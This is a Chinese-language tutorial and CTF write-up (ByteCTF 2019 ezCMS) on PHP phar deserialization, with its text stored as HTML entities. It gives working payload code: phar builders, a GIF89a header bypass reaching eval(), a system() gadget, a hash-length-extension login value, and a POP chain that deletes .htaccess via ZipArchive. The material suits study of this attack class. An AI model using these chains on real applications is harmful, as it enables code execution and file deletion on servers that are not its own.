Phar&#x53CD;&#x5E8F;&#x5217;&#x5316;phar&#x7684;&#x603B;&#x7ED3;&#x7C7B;&#x6587;&#x7AE0;&#x5DF2;&#x7ECF;&#x6709;&#x5F88;&#x591A;&#x4E86;&#xFF0C;&#x6BD4;&#x5982;Hu3sky&#x5B66;&#x957F;&#x7684;&#x521D;&#x63A2;phar:// &#x81EA;&#x5DF1;&#x5728;&#x603B;&#x7ED3;phar&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x53C8;&#x5B66;&#x4E60;&#x5230;&#x4E86;&#x4E00;&#x4E9B;&#x65B0;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x505A;&#x4E0B;&#x8BB0;&#x5F55;&#x3002; phar&#x6587;&#x4EF6;&#x7684;&#x7ED3;&#x6784;&#xFF1A;phar&#x6587;&#x4EF6;&#x90FD;&#x5305;&#x542B;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x90E8;&#x5206;&#xFF1A; 1. stub phar&#x6587;&#x4EF6;&#x7684;&#x6807;&#x5FD7;&#xFF0C;&#x5FC5;&#x987B;&#x4EE5; xxx __HALT_COMPILER();?&gt; &#x7ED3;&#x5C3E;&#xFF0C;&#x5426;&#x5219;&#x65E0;&#x6CD5;&#x8BC6;&#x522B;&#x3002;xxx&#x53EF;&#x4EE5;&#x4E3A;&#x81EA;&#x5B9A;&#x4E49;&#x5185;&#x5BB9;&#x3002; 2. manifest phar&#x6587;&#x4EF6;&#x672C;&#x8D28;&#x4E0A;&#x662F;&#x4E00;&#x79CD;&#x538B;&#x7F29;&#x6587;&#x4EF6;&#xFF0C;&#x5176;&#x4E2D;&#x6BCF;&#x4E2A;&#x88AB;&#x538B;&#x7F29;&#x6587;&#x4EF6;&#x7684;&#x6743;&#x9650;&#x3001;&#x5C5E;&#x6027;&#x7B49;&#x4FE1;&#x606F;&#x90FD;&#x653E;&#x5728;&#x8FD9;&#x90E8;&#x5206;&#x3002;&#x8FD9;&#x90E8;&#x5206;&#x8FD8;&#x4F1A;&#x4EE5;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5F62;&#x5F0F;&#x5B58;&#x50A8;&#x7528;&#x6237;&#x81EA;&#x5B9A;&#x4E49;&#x7684;meta-data&#xFF0C;&#x8FD9;&#x662F;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x6700;&#x6838;&#x5FC3;&#x7684;&#x5730;&#x65B9;&#x3002; 3. content &#x88AB;&#x538B;&#x7F29;&#x6587;&#x4EF6;&#x7684;&#x5185;&#x5BB9; 4. signature (&#x53EF;&#x7A7A;) &#x7B7E;&#x540D;&#xFF0C;&#x653E;&#x5728;&#x672B;&#x5C3E;&#x3002; &#x751F;&#x6210;&#x4E00;&#x4E2A;phar&#x6587;&#x4EF6;&#xFF1A;php&#x5185;&#x7F6E;&#x4E86;&#x4E00;&#x4E2A;phar&#x7C7B;&#x6765;&#x5904;&#x7406;&#x76F8;&#x5173;&#x64CD;&#x4F5C;&#x3002; &#x6CE8;&#x610F;&#xFF1A;&#x8FD9;&#x91CC;&#x8981;&#x5C06;php.ini&#x91CC;&#x9762;&#x7684;phar.readonly&#x9009;&#x9879;&#x8BBE;&#x7F6E;&#x4E3A;Off&#x3002;&#x5E76;&#x628A;&#x5206;&#x53F7;&#x53BB;&#x6389;&#x3002; (&#x5982;&#x679C;&#x4F60;&#x5728;&#x547D;&#x4EE4;&#x884C;&#x8FD0;&#x884C;PHP&#x6587;&#x4EF6;&#x8FD8;&#x662F;&#x65E0;&#x6CD5;&#x751F;&#x6210;&#x6210;&#x529F;&#xFF0C;&#x8BF7;&#x4F7F;&#x7528;php -v&#x67E5;&#x770B;php&#x7248;&#x672C;&#x5E76;&#x5728;&#x4FEE;&#x6539;&#x6307;&#x5B9A;&#x7248;&#x672C;&#x7684;php.ini&#x3002;) 1234567891011121314&lt;?php class TestObject { } @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); //&#x540E;&#x7F00;&#x540D;&#x5FC5;&#x987B;&#x4E3A;phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //&#x8BBE;&#x7F6E;stub $o = new TestObject(); $phar-&gt;setMetadata($o); //&#x5C06;&#x81EA;&#x5B9A;&#x4E49;&#x7684;meta-data&#x5B58;&#x5165;manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //&#x6DFB;&#x52A0;&#x8981;&#x538B;&#x7F29;&#x7684;&#x6587;&#x4EF6; //&#x7B7E;&#x540D;&#x81EA;&#x52A8;&#x8BA1;&#x7B97; $phar-&gt;stopBuffering();?&gt; &#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x6761;&#x4EF6; phar&#x6587;&#x4EF6;&#x8981;&#x80FD;&#x591F;&#x4E0A;&#x4F20;&#x5230;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x3002; &#x8981;&#x6709;&#x53EF;&#x7528;&#x7684;&#x9B54;&#x672F;&#x65B9;&#x6CD5;&#x4F5C;&#x4E3A;&#x201C;&#x8DF3;&#x677F;&#x201D;&#x3002; &#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#x51FD;&#x6570;&#x7684;&#x53C2;&#x6570;&#x53EF;&#x63A7;&#xFF0C;&#x4E14;:&#x3001;/&#x3001;phar&#x7B49;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x6CA1;&#x6709;&#x88AB;&#x8FC7;&#x6EE4;&#x3002; phar&#x53D7;&#x5F71;&#x54CD;&#x7684;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#x51FD;&#x6570;&#xFF1A;&#x77E5;&#x9053;&#x521B;&#x5B87;&#x6D4B;&#x8BD5;&#x540E;&#x53D7;&#x5F71;&#x54CD;&#x7684;&#x51FD;&#x6570;&#x5217;&#x8868;&#xFF1A; &#x4F46;&#x5B9E;&#x9645;&#x5E76;&#x4E0D;&#x6B62;&#x8FD9;&#x4E00;&#x4E9B;&#x3002; &#x53C2;&#x8003;zxc&#x5E08;&#x5085;&#x7684;&#x6587;&#x7AE0;&#xFF1A;https://blog.zsxsoft.com/post/38 &#x5728;&#x8DDF;&#x8E2A;&#x4E86;&#x53D7;&#x5F71;&#x54CD;&#x51FD;&#x6570;&#x7684;&#x8C03;&#x7528;&#x60C5;&#x51B5;&#x540E;&#x53D1;&#x73B0;&#xFF0C;&#x9664;&#x4E86;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x51FD;&#x6570;&#xFF0C;&#x53EA;&#x8981;&#x662F;&#x51FD;&#x6570;&#x7684;&#x5B9E;&#x73B0;&#x8FC7;&#x7A0B;&#x76F4;&#x63A5;&#x6216;&#x95F4;&#x63A5;&#x8C03;&#x7528;&#x4E86;php_stream_open_wrapper&#x3002;&#x90FD;&#x53EF;&#x80FD;&#x89E6;&#x53D1;phar&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x3002; &#x4EE5;&#x4E0B;&#x8FD9;&#x4E9B;&#x65B9;&#x5F0F;&#x90FD;&#x53EF;&#x89E6;&#x53D1;phar&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#xFF1A; exif exif_thumbnail exif_imagetype gd imageloadfont imagecreatefrom*** hash hash_hmac_file hash_file hash_update_file md5_file sha1_file file / url get_meta_tags get_headers standard getimagesize getimagesizefromstring zip $zip = new ZipArchive(); $res = $zip-&gt;open(&apos;c.zip&apos;); $zip-&gt;extractTo(&apos;phar://test.phar/test&apos;); Bzip / Gzip &#x5F53;&#x73AF;&#x5883;&#x9650;&#x5236;&#x4E86;phar&#x4E0D;&#x80FD;&#x51FA;&#x73B0;&#x5728;&#x524D;&#x9762;&#x7684;&#x5B57;&#x7B26;&#x91CC;&#x3002;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;compress.bzip2://&#x548C;compress.zlib://&#x7ED5;&#x8FC7; $z = &apos;compress.bzip2://phar:///home/sx/test.phar/test.txt&apos;; $z = &apos;compress.zlib://phar:///home/sx/test.phar/test.txt&apos;; &#x914D;&#x5408;&#x5176;&#x4ED6;&#x534F;&#x8BAE;&#xFF1A;(SUCTF) &#x5F53;&#x73AF;&#x5883;&#x9650;&#x5236;&#x4E86;phar&#x4E0D;&#x80FD;&#x51FA;&#x73B0;&#x5728;&#x524D;&#x9762;&#x7684;&#x5B57;&#x7B26;&#x91CC;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x914D;&#x5408;&#x5176;&#x4ED6;&#x534F;&#x8BAE;&#x8FDB;&#x884C;&#x5229;&#x7528;&#x3002; php://filter/read=convert.base64-encode/resource=phar://phar.phar &#x8FD9;&#x6B21;&#x7684;ByteCTF&#x4E5F;&#x6709;&#x8FD9;&#x4E2A;&#x70B9;&#x3002;&#x4F7F;&#x7528;&#x7684;&#x662F;&#xFF1A;php://filter/resource=phar://phar.phar Postgres 1234&lt;?php $pdo = new PDO(sprintf(&quot;pgsql:host=%s;dbname=%s;user=%s;password=%s&quot;, &quot;127.0.0.1&quot;, &quot;postgres&quot;, &quot;sx&quot;, &quot;123456&quot;)); @$pdo-&gt;pgsqlCopyFromFile(&apos;aa&apos;, &apos;phar://phar.phar/aa&apos;);?&gt; pgsqlCopyToFile&#x548C;pg_trace&#x540C;&#x6837;&#x4E5F;&#x662F;&#x80FD;&#x4F7F;&#x7528;&#x7684;&#xFF0C;&#x9700;&#x8981;&#x5F00;&#x542F;phar&#x7684;&#x5199;&#x529F;&#x80FD;&#x3002; Mysql LOAD DATA LOCAL INFILE&#x4E5F;&#x4F1A;&#x89E6;&#x53D1;&#x8FD9;&#x4E2A;php_stream_open_wrapper &#x914D;&#x7F6E;&#x4E00;&#x4E0B;mysqld: [mysqld] local-infile=1 secure_file_priv=&quot;&quot; 123456789101112&lt;?phpclass A { public $s = &apos;&apos;; public function __wakeup () { system($this-&gt;s); }}$m = mysqli_init();mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);$s = mysqli_real_connect($m, &apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;, &apos;testtable&apos;, 3306);$p = mysqli_query($m, &apos;LOAD DATA LOCAL INFILE \\&apos;phar://test.phar/test\\&apos; INTO TABLE a LINES TERMINATED BY \\&apos;\\r\\n\\&apos; IGNORE 1 LINES;&apos;);?&gt; &#x6F0F;&#x6D1E;&#x7684;&#x5229;&#x7528;&#x5B9E;&#x4F8B;&#xFF1A;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;phar.php 12345678910111213&lt;?php class TestObject { } $phar = new Phar(&quot;phar.phar&quot;); //&#x540E;&#x7F00;&#x540D;&#x5FC5;&#x987B;&#x4E3A;phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //&#x8BBE;&#x7F6E;stub $o = new TestObject(); $o -&gt; name=&apos;Threezh1&apos;; //&#x63A7;&#x5236;TestObject&#x4E2D;&#x7684;name&#x53D8;&#x91CF;&#x4E3A;Threezh1 $phar-&gt;setMetadata($o); //&#x5C06;&#x81EA;&#x5B9A;&#x4E49;&#x7684;meta-data&#x5B58;&#x5165;manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //&#x6DFB;&#x52A0;&#x8981;&#x538B;&#x7F29;&#x7684;&#x6587;&#x4EF6; //&#x7B7E;&#x540D;&#x81EA;&#x52A8;&#x8BA1;&#x7B97; $phar-&gt;stopBuffering();?&gt; index.php 12345678910111213&lt;?phpclass TestObject { public $name; function __destruct() { echo $this -&gt; name; }}if ($_GET[&quot;file&quot;]){ file_exists($_GET[&quot;file&quot;]);}?&gt; &#x4F7F;&#x7528;php phar.php&#x751F;&#x6210;phar.phar&#x6587;&#x4EF6;&#x3002; &#x8BBF;&#x95EE;&#xFF1A;http://127.0.0.1/index.php?file=phar://phar.phar &#x8FD4;&#x56DE;&#xFF1A;Threezh1&#x3002; &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5229;&#x7528;&#x6210;&#x529F;&#x3002; &#x7ED5;&#x8FC7;&#x6587;&#x4EF6;&#x683C;&#x5F0F;&#x9650;&#x5236; &#x4E0A;&#x4F20;html&#x9875;&#x9762;: upload.html &#x540E;&#x7AEF;&#x6821;&#x9A8C;&#x9875;&#x9762;&#xFF1A;upload.php &#x4E00;&#x4E2A;&#x6F0F;&#x6D1E;&#x9875;&#x9762;&#xFF1A;index.php (&#x5B58;&#x5728;file_exits(), eval()&#x51FD;&#x6570;) &#x4E00;&#x4E2A;&#x4E0A;&#x4F20;&#x76EE;&#x5F55;&#xFF1A; upload_file/ upload.html: 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;upload file&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://127.0.0.1/upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; name=&quot;Upload&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; upload.php &#x4EC5;&#x5141;&#x8BB8;&#x683C;&#x5F0F;&#x4E3A;gif&#x7684;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x3002;&#x4E0A;&#x4F20;&#x6210;&#x529F;&#x7684;&#x6587;&#x4EF6;&#x4F1A;&#x5B58;&#x50A8;&#x5230;upload_file&#x76EE;&#x5F55;&#x4E0B;&#x3002; 123456789101112131415161718192021&lt;?phpif (($_FILES[&quot;file&quot;][&quot;type&quot;]==&quot;image/gif&quot;)&amp;&amp;(substr($_FILES[&quot;file&quot;][&quot;name&quot;], strrpos($_FILES[&quot;file&quot;][&quot;name&quot;], &apos;.&apos;)+1))== &apos;gif&apos;) { echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]; echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;]; echo &quot;Temp file: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; if (file_exists(&quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;])) { echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;; } else { move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload_file/&quot; .$_FILES[&quot;file&quot;][&quot;name&quot;]); echo &quot;Stored in: &quot; . &quot;upload_file/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]; } }else { echo &quot;Invalid file,you can only upload gif&quot;; } index.php 1234567891011&lt;?phpclass TestObject{ var $data = &apos;echo &quot;Hello World&quot;;&apos;; function __destruct() { eval($this -&gt; data); }}if ($_GET[&quot;file&quot;]){ file_exists($_GET[&quot;file&quot;]);} &#x7ED5;&#x8FC7;&#x601D;&#x8DEF;&#xFF1A;GIF&#x683C;&#x5F0F;&#x9A8C;&#x8BC1;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5728;&#x6587;&#x4EF6;&#x5934;&#x90E8;&#x6DFB;&#x52A0;GIF89a&#x7ED5;&#x8FC7; &#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6784;&#x9020;&#x4E00;&#x4E2A;php&#x6765;&#x751F;&#x6210;phar.phar&#x3002; 12345678910111213&lt;?php class TestObject { } $phar = new Phar(&quot;phar.phar&quot;); //&#x540E;&#x7F00;&#x540D;&#x5FC5;&#x987B;&#x4E3A;phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //&#x8BBE;&#x7F6E;stub $o = new TestObject(); $o -&gt; data=&apos;phpinfo();&apos;; //&#x63A7;&#x5236;TestObject&#x4E2D;&#x7684;data&#x4E3A;phpinfo()&#x3002; $phar-&gt;setMetadata($o); //&#x5C06;&#x81EA;&#x5B9A;&#x4E49;&#x7684;meta-data&#x5B58;&#x5165;manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //&#x6DFB;&#x52A0;&#x8981;&#x538B;&#x7F29;&#x7684;&#x6587;&#x4EF6; //&#x7B7E;&#x540D;&#x81EA;&#x52A8;&#x8BA1;&#x7B97; $phar-&gt;stopBuffering();?&gt; &#x5229;&#x7528;&#x8FC7;&#x7A0B;&#xFF1A; &#x4E00;&#x3001;&#x751F;&#x6210;&#x4E00;&#x4E2A;phar.phar&#xFF0C;&#x4FEE;&#x6539;&#x540E;&#x7F00;&#x540D;&#x4E3A;phar.gif &#x4E8C;&#x3001;&#x4E0A;&#x4F20;&#x5230;upload_file&#x76EE;&#x5F55;&#x4E0B; &#x4E09;&#x3001;&#x8BBF;&#x95EE;&#xFF1A;http://127.0.0.1/index.php?file=upload_file/phar.gif &#x53EF;&#x89C1;&#x5DF2;&#x7ECF;&#x6267;&#x884C;&#x4E86;phpinfo&#x547D;&#x4EE4;&#x4E86;&#x3002; &#x901A;&#x8FC7;&#x4FEE;&#x6539;&#x540E;&#x7F00;&#x540D;&#x548C;&#x6587;&#x4EF6;&#x5934;&#xFF0C;&#x80FD;&#x591F;&#x7ED5;&#x8FC7;&#x5927;&#x90E8;&#x5206;&#x7684;&#x6821;&#x9A8C;&#x3002; &#x914D;&#x5408;PHP&#x5185;&#x6838;&#x54C8;&#x5E0C;&#x8868;&#x78B0;&#x649E;&#x653B;&#x51FB;&#x53C2;&#x8003;&#xFF1A;https://xz.aliyun.com/t/2613 &#x539F;&#x751F;&#x7C7B;&#x5E8F;&#x5217;&#x5316;(ZipArchive::open)&#x62FF;&#x8FD9;&#x6B21;2019 ByteCTF&#x7684;ezCMS&#x8FD9;&#x9053;&#x9898;&#x6765;&#x5B66;&#x4E60;&#x8FD9;&#x4E2A;&#x77E5;&#x8BC6;&#x70B9;&#x3002; &#x5148;&#x662F;&#x54C8;&#x5E0C;&#x957F;&#x5EA6;&#x6269;&#x5C55;&#x653B;&#x51FB; &#x53C2;&#x8003; &#x767B;&#x5F55;&#x8D26;&#x6237;&#xFF1A;admin &#x767B;&#x5F55;&#x5BC6;&#x7801;&#xFF1A;admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00test &#x7F6E;cookie&#xFF1A;user=2e05fd4ee5d0ec7853d174d06cd3ca47; config.php&#xFF1A; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165&lt;?phpsession_start();error_reporting(0);$sandbox_dir = &apos;sandbox/&apos;. md5($_SERVER[&apos;REMOTE_ADDR&apos;]); // sandbox + md5(ip)global $sandbox_dir;function login(){ $secret = &quot;********&quot;; setcookie(&quot;hash&quot;, md5($secret.&quot;adminadmin&quot;)); return 1;# 52107b08c0f3342d2153ae1d68e6262c}function is_admin(){ $secret = &quot;********&quot;; $username = $_SESSION[&apos;username&apos;]; $password = $_SESSION[&apos;password&apos;]; if ($username == &quot;admin&quot; &amp;&amp; $password != &quot;admin&quot;){ if ($_COOKIE[&apos;user&apos;] === md5($secret.$username.$password)){ return 1; } } return 0;}class Check{ // &#x68C0;&#x67E5;&#x4E00;&#x4E9B;&#x5173;&#x952E;&#x5B57; public $filename; function __construct($filename) { $this-&gt;filename = $filename; } function check(){ $content = file_get_contents($this-&gt;filename); $black_list = [&apos;system&apos;,&apos;eval&apos;,&apos;exec&apos;,&apos;+&apos;,&apos;passthru&apos;,&apos;`&apos;,&apos;assert&apos;]; // &#x68C0;&#x67E5;&#x4E86;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x4E00;&#x4E9B;&#x5173;&#x952E;&#x5B57; foreach ($black_list as $k=&gt;$v){ if (stripos($content, $v) !== false){ die(&quot;your file make me scare&quot;); } } return 1; }}class File{ public $filename; public $filepath; public $checker; function __construct($filename, $filepath) { $this-&gt;filepath = $filepath; $this-&gt;filename = $filename; } public function view_detail(){ if (preg_match(&apos;/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i&apos;, $this-&gt;filepath)){ die(&quot;nonono~&quot;); } $mine = mime_content_type($this-&gt;filepath); //&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x89E6;&#x53D1;phar&#x53CD;&#x5E8F;&#x5217;&#x5316; $store_path = $this-&gt;open($this-&gt;filename, $this-&gt;filepath); $res[&apos;mine&apos;] = $mine; $res[&apos;store_path&apos;] = $store_path; return $res; } public function open($filename, $filepath){ $res = &quot;$filename is in $filepath&quot;; return $res; } function __destruct() //&#x7C7B;&#x88AB;&#x9500;&#x6BC1;&#x65F6;&#x81EA;&#x52A8;&#x89E6;&#x53D1; { if (isset($this-&gt;checker)){ $this-&gt;checker-&gt;upload_file(); //&#x8C03;&#x7528;upload_file()&#x65B9;&#x6CD5; } }}class Admin{ public $size; public $checker; public $file_tmp; public $filename; public $upload_dir; public $content_check; function __construct($filename, $file_tmp, $size) { $this-&gt;upload_dir = &apos;sandbox/&apos;.md5($_SERVER[&apos;REMOTE_ADDR&apos;]); if (!file_exists($this-&gt;upload_dir)){ mkdir($this-&gt;upload_dir, 0777, true); } if (!is_file($this-&gt;upload_dir.&apos;/.htaccess&apos;)){ file_put_contents($this-&gt;upload_dir.&apos;/.htaccess&apos;, &apos;lolololol, i control all&apos;); } $this-&gt;size = $size; $this-&gt;filename = $filename; $this-&gt;file_tmp = $file_tmp; $this-&gt;content_check = new Check($this-&gt;file_tmp); $profile = new Profile(); $this-&gt;checker = $profile-&gt;is_admin(); } public function upload_file(){ if (!$this-&gt;checker){ die(&apos;u r not admin&apos;); } $this-&gt;content_check -&gt; check(); $tmp = explode(&quot;.&quot;, $this-&gt;filename); $ext = end($tmp); // if ($this-&gt;size &gt; 204800){ die(&quot;your file is too big&quot;); } # move_uploaded_file($this-&gt;file_tmp, $this-&gt;upload_dir.&apos;/&apos;.md5($this-&gt;filename).&apos;.&apos;.$ext); } public function __call($name, $arguments) { }}class Profile{ public $username; public $password; public $admin; public function is_admin(){ //&#x4ECE;SESSION&#x5F53;&#x4E2D;&#x53D6;&#x7528;&#x6237;&#x540D;&#x548C;&#x5BC6;&#x7801; $this-&gt;username = $_SESSION[&apos;username&apos;]; $this-&gt;password = $_SESSION[&apos;password&apos;]; $secret = &quot;********&quot;; if ($this-&gt;username === &quot;admin&quot; &amp;&amp; $this-&gt;password != &quot;admin&quot;){ if ($_COOKIE[&apos;user&apos;] === md5($secret.$this-&gt;username.$this-&gt;password)){ return 1; } } return 0; } function __call($name, $arguments) //&#x5F53;&#x8C03;&#x7528;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x65B9;&#x5F0F;&#x65F6;&#x89E6;&#x53D1; { $this-&gt;admin-&gt;open($this-&gt;username, $this-&gt;password); //&#x8FD9;&#x91CC;&#x4F5C;&#x4E3A; }} view.php: 123456789101112131415161718192021&lt;?phperror_reporting(0);include (&quot;config.php&quot;);$file_name = $_GET[&apos;filename&apos;];$file_path = $_GET[&apos;filepath&apos;];$file_name=urldecode($file_name);$file_path=urldecode($file_path);$file = new File($file_name, $file_path); //&#x8C03;&#x7528;File&#x7C7B;$res = $file-&gt;view_detail(); //&#x8C03;&#x7528;view_detail&#x65B9;&#x6CD5;$mine = $res[&apos;mine&apos;];$store_path = $res[&apos;store_path&apos;];echo &lt;&lt;&lt;EOT&lt;div style=&quot;height: 30px; width: 1000px;&quot;&gt;&lt;Ariel&gt;mine: {$mine}&lt;/Ariel&gt;&lt;br&gt;&lt;/div&gt;&lt;div style=&quot;height: 30px; &quot;&gt;&lt;Ariel&gt;file_path: {$store_path}&lt;/Ariel&gt;&lt;br&gt;&lt;/div&gt;EOT;?&gt; &#x5728;view.php&#x4E2D;&#xFF0C;url&#x4E2D;&#x4F20;&#x9012;&#x7684;filename&#x4E0E;filepath&#x8FDB;&#x884C;&#x4E00;&#x6B21;url&#x7F16;&#x7801;&#x4E4B;&#x540E;&#x4F20;&#x9012;&#x5230;File&#x7C7B;&#x4E2D;&#x8C03;&#x7528;view_detail&#x65B9;&#x6CD5;&#x3002; view_detail&#x65B9;&#x6CD5;&#x4E2D;&#x5B58;&#x5728;&#x4E00;&#x4E2A;mime_content_type()&#x51FD;&#x6570;, &#x8FD9;&#x4E2A;&#x51FD;&#x6570;&#x662F;&#x53EF;&#x4EE5;&#x5BFC;&#x81F4;phar&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x3002; &#x5728;&#x6B64;&#x4E4B;&#x524D;&#xFF1A; 123if (preg_match(&apos;/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i&apos;, $this-&gt;filepath)){ die(&quot;nonono~&quot;); } &#x8FD9;&#x4E2A;&#x6B63;&#x5219;&#x7981;&#x6B62;&#x4E86;&#x5927;&#x90E8;&#x5206;&#x7684;&#x8FDB;&#x884C;phar&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5173;&#x952E;&#x8BCD;&#xFF0C;&#x4E0D;&#x5141;&#x8BB8;&#x8FD9;&#x4E9B;&#x5173;&#x952E;&#x8BCD;&#x51FA;&#x73B0;&#x5728;filepath&#x7684;&#x5F00;&#x5934;&#x3002;&#x4F46;&#x662F;&#x8FD9;&#x91CC;&#x6F0F;&#x4E86;&#x4E00;&#x4E2A;php://&#x534F;&#x8BAE;&#x3002; &#x53C2;&#x8003;SUCTF &#x627E;&#x5230;&#x4E86;phar&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x89E6;&#x53D1;&#x70B9;&#x4E4B;&#x540E;&#xFF0C;&#x5F00;&#x59CB;&#x6784;&#x9020;&#x4E00;&#x6761;&#x53EF;&#x5229;&#x7528;&#x7684;POP&#x94FE;&#xFF0C;&#x601D;&#x8DEF;&#xFF1A; File&#x7C7B;&#x7684;__destruct()&#x4F1A;&#x8C03;&#x7528;$this-&gt;checker-&gt;upload_file()&#x3002;&#x53EF;&#x4EE5;&#x5C06;$this-&gt;checker&#x8D4B;&#x503C;&#x4E3A;Profile&#x7C7B; &#x56E0;&#x4E3A;$this-&gt;checker&#x6CA1;&#x6709;Profile&#x7C7B;&#xFF0C;&#x89E6;&#x53D1;__call()&#x9B54;&#x672F;&#x65B9;&#x6CD5; &#x8C03;&#x7528;$this-&gt;admin-&gt;open($this-&gt;username, $this-&gt;password); &#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x539F;&#x751F;&#x7C7B;&#x53CD;&#x5E8F;&#x5217;&#x5316; &#x539F;&#x751F;&#x7C7B;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x53C2;&#x8003; &#x7B80;&#x8981;&#x7B14;&#x8BB0;&#xFF1A; &#x5229;&#x7528;PHP&#x51FD;&#x6570; ZipArchive::open($filename, $flags) &#x5F53;$flag=ZipArchive::OVERWRITE&#x65F6;&#xFF0C;&#x5C31;&#x4F1A;&#x5C06;$filename&#x7684;&#x6587;&#x4EF6;&#x5220;&#x9664; &#x6784;&#x9020;Payload&#xFF1A; 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass File{ public $filename; public $filepath; public $checker; function __construct($filename, $filepath) { $this-&gt;filepath = $filepath; $this-&gt;filename = $filename; $this-&gt;checker = new Profile(); } }class Profile{ public $username; public $password; public $admin; function __construct() { $this-&gt;username = &quot;./sandbox/f528764d624db129b32c21fbca0cb8d6/.htaccess&quot;; $this-&gt;password = &quot;ZipArchive::OVERWRITE&quot;; $this-&gt;admin = new ZipArchive(); } }$a = new File(&quot;threezh1&quot;, &quot;threezh1&quot;);class TestObject {}@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;); //&#x540E;&#x7F00;&#x540D;&#x5FC5;&#x987B;&#x4E3A;phar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //&#x8BBE;&#x7F6E;stub$o = new TestObject();$phar-&gt;setMetadata($a); //&#x5C06;&#x81EA;&#x5B9A;&#x4E49;&#x7684;meta-data&#x5B58;&#x5165;manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //&#x6DFB;&#x52A0;&#x8981;&#x538B;&#x7F29;&#x7684;&#x6587;&#x4EF6;//&#x7B7E;&#x540D;&#x81EA;&#x52A8;&#x8BA1;&#x7B97;$phar-&gt;stopBuffering();?&gt; &#x5148;&#x628A;phar&#x6587;&#x4EF6;&#x751F;&#x6210;&#x51FA;&#x6765;&#x4E0A;&#x4F20;&#x3002; &#x518D;&#x8BBF;&#x95EE;&#xFF1A;http://127.0.0.1/view.php?filename=9c7f4a2fbf2dd3dfb7051727a644d99f.phar&amp;filepath=php://filter/resource=phar://sandbox/f528764d624db129b32c21fbca0cb8d6/9c7f4a2fbf2dd3dfb7051727a644d99f.phar 